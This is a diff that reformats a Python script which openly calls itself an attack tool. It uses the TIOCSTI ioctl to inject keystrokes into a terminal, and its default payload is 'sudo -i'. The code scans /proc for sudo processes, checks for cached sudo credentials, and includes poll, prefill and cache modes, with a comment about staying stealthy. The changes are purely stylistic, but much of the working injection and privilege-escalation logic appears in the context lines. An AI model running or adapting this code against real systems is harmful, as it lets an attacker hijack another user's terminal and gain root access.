@@ -15,30 +15,38 @@ from pathlib import Path
 # ---------------------- CONSTANTS ----------------------
 TIOCSTI = 0x5412
 LOG_FILE = "/tmp/tiocsti_advanced.log"
-DEV_NULL = open(os.devnull, 'wb')
+DEV_NULL = open(os.devnull, "wb")
 
 # ---------------------- ARGUMENT PARSING ----------------------
 parser = argparse.ArgumentParser(description="Advanced TIOCSTI injection with multiple attack modes.")
-parser.add_argument("--mode", choices=["poll", "prefill", "cache"], default="poll",
-                    help="Attack mode: poll (wait for sudo to exit), prefill (inject repeatedly), cache (use sudo -n)")
-parser.add_argument("--payload", default="sudo -i\n",
-                    help="Command(s) to inject, separated by \\n (default: 'sudo -i\\n')")
-parser.add_argument("--poll-interval", type=float, default=0.05,
-                    help="Polling interval in seconds (default: 0.05 = 50ms)")
-parser.add_argument("--inject-interval", type=float, default=0.5,
-                    help="Interval between injections in prefill mode (default: 0.5s)")
-parser.add_argument("--max-injections", type=int, default=20,
-                    help="Maximum injection attempts in prefill mode (default: 20)")
+parser.add_argument(
+    "--mode",
+    choices=["poll", "prefill", "cache"],
+    default="poll",
+    help="Attack mode: poll (wait for sudo to exit), prefill (inject repeatedly), cache (use sudo -n)",
+)
+parser.add_argument(
+    "--payload", default="sudo -i\n", help="Command(s) to inject, separated by \\n (default: 'sudo -i\\n')"
+)
+parser.add_argument(
+    "--poll-interval", type=float, default=0.05, help="Polling interval in seconds (default: 0.05 = 50ms)"
+)
+parser.add_argument(
+    "--inject-interval", type=float, default=0.5, help="Interval between injections in prefill mode (default: 0.5s)"
+)
+parser.add_argument(
+    "--max-injections", type=int, default=20, help="Maximum injection attempts in prefill mode (default: 20)"
+)
 parser.add_argument("--log", action="store_true", help="Enable verbose logging")
 args = parser.parse_args()
 
 # ---------------------- LOGGING ----------------------
 if args.log:
-    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG,
-                        format="%(asctime)s [%(levelname)s] %(message)s")
+    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
 else:
     logging.basicConfig(level=logging.WARNING)
 log = logging.getLogger("tiocsti_adv")
+
 
 # ---------------------- TTY DISCOVERY ----------------------
 def get_controlling_tty() -> tuple:
@@ -50,6 +58,7 @@ def get_controlling_tty() -> tuple:
     except OSError as e:
         log.error("No controlling TTY: %s", e)
         sys.exit(1)
+
 
 # ---------------------- INJECTION PRIMITIVE ----------------------
 def inject_byte(fd: int, byte_char: bytes) -> bool:
@@ -66,6 +75,7 @@ def inject_byte(fd: int, byte_char: bytes) -> bool:
         log.debug("Unexpected: %s", e)
         return False
 
+
 def inject_payload(fd: int, payload: str, char_delay: float = 0.005) -> bool:
     """
     Inject a multi‑character payload. Returns True if all characters were
@@ -74,7 +84,7 @@ def inject_payload(fd: int, payload: str, char_delay: float = 0.005) -> bool:
     success_all = True
     for ch in payload:
         # Convert to bytes (handles multi‑byte UTF‑8 characters)
-        for byte in ch.encode('utf-8'):
+        for byte in ch.encode("utf-8"):
             ok = False
             for _ in range(3):  # retry up to 3 times per byte
                 if inject_byte(fd, bytes([byte])):
@@ -86,6 +96,7 @@ def inject_payload(fd: int, payload: str, char_delay: float = 0.005) -> bool:
                 success_all = False
         time.sleep(char_delay)
     return success_all
+
 
 # ---------------------- SUDO DETECTION (via /proc) ----------------------
 def get_sudo_pids_on_tty(tty_path: str) -> list[int]:
@@ -116,23 +127,23 @@ def get_sudo_pids_on_tty(tty_path: str) -> list[int]:
                     continue
                 # Read comm (field 2) to see if it's sudo
                 # comm is in parentheses, e.g., "(sudo)"
-                comm = stat_data[1].strip('()')
+                comm = stat_data[1].strip("()")
                 if comm == "sudo" or comm.startswith("sudo"):
                     pids.append(pid)
         except (OSError, ValueError, IndexError):
             continue
     return pids
 
+
 # ---------------------- CACHE CHECK (sudo -n) ----------------------
 def sudo_cache_valid() -> bool:
     """Return True if sudo credentials are cached (i.e., sudo -n succeeds)."""
     try:
-        result = subprocess.run(["sudo", "-n", "true"],
-                                stdout=DEV_NULL, stderr=DEV_NULL,
-                                timeout=1)
+        result = subprocess.run(["sudo", "-n", "true"], stdout=DEV_NULL, stderr=DEV_NULL, timeout=1)
         return result.returncode == 0
     except Exception:
         return False
+
 
 # ---------------------- MAIN ATTACK MODES ----------------------
 def mode_poll(fd: int, tty_path: str):
@@ -160,15 +171,16 @@ def mode_poll(fd: int, tty_path: str):
         else:
             time.sleep(args.poll_interval)
 
+
 def mode_prefill(fd: int):
     """Inject payload repeatedly, regardless of sudo state."""
-    log.info("PREFILL mode: injecting every %.2f seconds (max %d times)",
-             args.inject_interval, args.max_injections)
+    log.info("PREFILL mode: injecting every %.2f seconds (max %d times)", args.inject_interval, args.max_injections)
     for i in range(args.max_injections):
         inject_payload(fd, args.payload)
-        log.debug("Injection cycle %d/%d", i+1, args.max_injections)
+        log.debug("Injection cycle %d/%d", i + 1, args.max_injections)
         time.sleep(args.inject_interval)
     log.info("Prefill completed.")
+
 
 def mode_cache(fd: int):
     """Check sudo cache; if valid, inject sudo -i once."""
@@ -180,6 +192,7 @@ def mode_cache(fd: int):
         log.warning("No cached sudo ticket – injection skipped.")
         # Optional fallback: inject a command that will trigger a password prompt
         # but that would be less stealthy; we just exit.
+
 
 # ---------------------- ENTRY POINT ----------------------
 def main():
@@ -195,8 +208,8 @@ def main():
 
     # Ensure payload ends with newline
     payload = args.payload
-    if not payload.endswith('\n'):
-        payload += '\n'
+    if not payload.endswith("\n"):
+        payload += "\n"
     args.payload = payload
 
     # Execute selected mode
@@ -216,6 +229,7 @@ def main():
 
     os.close(fd)
     log.info("Attacker finished.")
+
 
 if __name__ == "__main__":
     main()
